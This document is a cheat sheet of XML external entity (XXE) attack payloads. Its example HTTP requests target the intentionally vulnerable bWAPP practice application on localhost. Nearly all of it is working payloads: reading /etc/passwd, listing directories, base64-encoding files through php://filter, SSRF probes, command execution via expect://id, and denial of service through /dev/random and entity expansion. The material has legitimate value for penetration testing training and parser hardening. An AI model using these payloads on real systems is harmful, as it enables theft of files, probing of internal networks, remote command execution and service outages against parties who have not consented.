Get etc/passwd file
===================
__Payload:__


```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE Header [<!ENTITY xxe SYSTEM "///etc/passwd" >]>
```

__Request:__


```http
POST /bWAPP/bWAPP/xxe-2.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: text/xml; charset=UTF-8
Referer: http://127.0.0.1/bWAPP/bWAPP/xxe-1.php
Content-Length: 150
Cookie: security_level=0; PHPSESSID=233c7b2e688f1941842f9bd424841db5
Connection: close

 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "///etc/passwd">]>
<reset><login>&xxe;</login><secret>Any bugs?</secret></reset>

```


Calling The Remote File
========================

__Payload:__


```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://127.0.0.1/imx.txt" >]>
<reset><login>&xxe;</login><secret>Any bugs?</secret></reset>
```

__REQUEST:__


```http
POST /bWAPP/bWAPP/xxe-2.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: text/xml; charset=UTF-8
Referer: http://127.0.0.1/bWAPP/bWAPP/xxe-1.php
Content-Length: 162
Cookie: security_level=0; PHPSESSID=233c7b2e688f1941842f9bd424841db5
Connection: close

 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "http://127.0.0.1/imx.txt" >]>
<reset><login>&xxe;</login><secret>Any bugs?</secret></reset>
```


Calling The Local File
======================

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE Header [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<reset><login>&xxe;</login><secret>Any bugs?</secret></reset>
```

OR

```xml
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<reset><login>&xxe;</login><secret>Any bugs?</secret></reset>
```

---


__Reading Files__


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE student [
<!ENTITY oops SYSTEM "file:///etc/passwd">
]>
<student>
<name>&oops;</name>
</student>
```



__Listing Directories__


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE student [
<!ENTITY oops SYSTEM "file:///etc/ ">
]>
<student>
<name>&oops;</name>
</student>
```




__Base64 Conversion of Result__

```xml
<!DOCTYPE student [
<!ENTITY pwn SYSTEM "php://filter/convert.base64-
encode/resource=/etc/passwd">
]>
<student>
<name>&pwn;</name>
</student>

```



__XXE to SSRF__


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE student [
<!ENTITY oops SYSTEM "http://scanme.nmap.org:20/">
]>
<student>
<name>&oops;</name>
</student>
```




__xxe to RCE__


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
<!ENTITY rce SYSTEM "expect://id">
]>
<student>
<name>&rce;</name>
</student>
```


__XXE to DOS__


```xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE student [
<!ENTITY oops SYSTEM "file:///dev/random">
]>
<student>
<name>&oops;</name>
</student>
```




__XXE Quadratic blowup [DOS]__


```xml
<?xml version="1.0"?>
<!DOCTYPE student [
<!ENTITY x "xxxxxxxxxxxxxxxxx..."> (50,000-100,000)
]>
<student>&x;&x;&x;&x;&x;&x;&x;&x;&x;...</student> (50,000-100,00)
```

